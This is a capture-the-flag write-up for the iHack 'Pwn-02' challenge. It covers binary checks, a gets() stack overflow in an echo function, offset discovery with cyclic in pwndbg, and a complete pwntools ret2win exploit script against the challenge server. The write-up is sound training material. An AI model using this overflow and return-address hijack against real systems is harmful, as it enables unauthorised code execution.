# Pwn-02

**Flag Format:** `ihack{MD5}`

**Remote Instance:** `nc pwn2.ihack.sibersiaga.my 1389`

Perform basic file checks regarding the architecture of the given binary. It is `32-bit`, `LSB`, `statically linked` & `not stripped`. 

```
┌──(kali💀JesusCries)-[~/Desktop/iHack/pwn/pwn-02]
└─$ file chal_      
chal_: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=5358fac57714ea7cb10bc80150f5e24a113a6bf9, for GNU/Linux 3.2.0, not stripped
```

Perform binary protection checks to get an overall idea on where to start tackling the challenge. `NX enabled` indicating that shellcode injection may not be the intended solution.

```
┌──(kali💀JesusCries)-[~/Desktop/iHack/pwn/pwn-02]
└─$ checksec --file=chal_             
[*] '/home/kali/Desktop/iHack/pwn/pwn-02/chal_'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The binary to vulnerable to a Buffer Overflow attack due to the use of deprecated `gets` in the `echo` function. By exploiting this vulnerability, we can overwrite the return address to any function that we control.

```
void echo(void)

{
  char local_20 [24];
  
  putchar(10);
  puts("Hello There! Im echo bot =) I can say anything you want me to say ");
  putchar(10);
  puts("Enter some text:");
  fflush((FILE *)stdout);
  fflush((FILE *)stdin);
  gets(local_20);
  printf("You entered: %s\n",local_20);
  return;
}
```

There is also another function `ZmxhZ2hlcmUh` that prints out the flag on the remote instance. Since `PIE` is disabled, we can grab the address of this function in `Ghidra`, which is `0804988b`.

```
void ZmxhZ2hlcmUh(void)

{
  puts("Congratulations! Here is your flag!");
  system("cat flag.txt");
  return;
}
```

To find the buffer limit, we can use the `cyclic` module from `pwntools`.

```
┌──(kali💀JesusCries)-[~/Desktop/iHack/pwn/pwn-02]
└─$ cyclic 80            
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
```

```
pwndbg> run
Starting program: /home/kali/Desktop/iHack/pwn/pwn-02/chal_ 
 _______ _______ _______ _______ _______ _______ _______ _______ _______ 
|     /|     /|     /|     /|     /|     /|     /|     /|     /|
| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
| |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | |
| |I  | | |h  | | |a  | | |c  | | |k  | | |2  | | |0  | | |2  | | |2  | |
|/      |/      |/     |/     |/     |/     |/     |/     |/     |
 _______ _______ _______ _______ _______ _______ _______ _______ _______|
 
Hello There! Im echo bot =) I can say anything you want me to say 

Enter some text:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
You entered: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa

Program received signal SIGSEGV, Segmentation fault.
0x61616169 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0x5e
 EBX  0x61616167 ('gaaa')
 ECX  0x0
 EDX  0x0
 EDI  0x1
 ESI  0x80f1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 EBP  0x61616168 ('haaa')
 ESP  0xffffd030 ◂— 'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa'
 EIP  0x61616169 ('iaaa')
 
pwndbg> cyclic -l iaaa
32
```

We can automate the process using `pwntools` as follows:

```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal_')
rop = ROP(elf)

p = remote('pwn2.ihack.sibersiaga.my', 1389)

def exploit():

    padding = b'A'*32
    ret = (rop.find_gadget(['ret']))[0]
    flag = elf.symbols['ZmxhZ2hlcmUh']

    payload = padding
    payload += p32(ret)
    payload += p32(flag)

    print(p.recvuntil(b':\n'))

    print(payload)
    p.sendline(payload)

    print(p.recvall())

def main():
  exploit()

if __name__ == "__main__":
  main()
```

**Flag:** `ihack{}`